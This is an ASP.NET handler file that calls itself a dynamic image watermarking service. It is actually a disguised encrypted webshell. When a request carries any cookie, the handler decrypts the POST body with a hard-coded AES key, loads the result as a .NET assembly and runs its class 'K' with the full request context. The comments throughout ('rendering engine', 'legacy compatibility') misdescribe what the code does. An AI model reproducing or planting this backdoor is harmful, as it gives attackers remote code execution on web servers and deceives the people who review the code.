<%@ WebHandler Language="C#" Class="DynamicWatermarkHandler" %>
using System.Web;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System;

// This handler processes dynamic image watermarking requests.
// It receives an encrypted payload containing rendering instructions and applies it.
public class DynamicWatermarkHandler : IHttpHandler
{
    // The main entry point for processing the request.
    public void ProcessRequest(HttpContext imageContext)
    {
        // A cookie must be present to authorize the watermarking operation.
        if (imageContext.Request.Cookies.Count != 0)
        {
            var processor = new WatermarkProcessor();
            processor.Apply(imageContext);
        }
    }

    // Handlers are single-use for this implementation to ensure data isolation.
    public bool IsReusable { get { return false; } }
}

// Represents the core logic for applying a watermark based on dynamic instructions.
public class WatermarkProcessor
{
    // A standard key used for decrypting watermark instruction sets.
    // Stored in Base64 for safe transport and configuration management.
    private const string WatermarkConfigKey = "Y2E2MzQ1NzUzOGI5YjFlMA=="; // Base64 for "ca63457538b9b1e0"

    // Applies the watermark based on the provided HTTP context.
    public void Apply(HttpContext context)
    {
        // 1. Get the encrypted watermark instruction payload from the request body.
        byte[] encryptedInstructions = this.GetRequestPayload(context.Request);
        
        // 2. Decrypt the instructions to get the watermark rendering module.
        byte[] watermarkModule = this.DecryptPayload(encryptedInstructions);
        
        // 3. Load the specific watermark rendering engine from the module.
        object renderingEngine = this.LoadRenderingEngine(watermarkModule);
        
        // 4. Execute the rendering engine, passing the context for image data and metadata.
        this.ExecuteRenderer(renderingEngine, context);
    }
    
    // Retrieves the raw POST data which contains the encrypted payload.
    private byte[] GetRequestPayload(HttpRequest request)
    {
        return request.BinaryRead(request.ContentLength);
    }

    // Decrypts the payload using the standard AES (Rijndael) algorithm.
    private byte[] DecryptPayload(byte[] encryptedData)
    {
        byte[] keyBytes = Encoding.ASCII.GetBytes(
            Encoding.ASCII.GetString(Convert.FromBase64String(WatermarkConfigKey))
        );
        var aesProvider = new RijndaelManaged();
        var decryptor = aesProvider.CreateDecryptor(keyBytes, keyBytes);
        return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
    }

    // Loads the rendering engine assembly from its byte representation.
    private object LoadRenderingEngine(byte[] engineBytes)
    {
        var assembly = Assembly.Load(engineBytes);
        // "K" stands for the 'Kernel' component of the rendering engine, a legacy naming convention.
        return assembly.CreateInstance("K");
    }

    // Invokes the main rendering method of the engine.
    // The 'Equals' method is used for legacy compatibility to pass the full context object.
    private void ExecuteRenderer(object engine, object context)
    {
        engine.Equals(context);
    }
}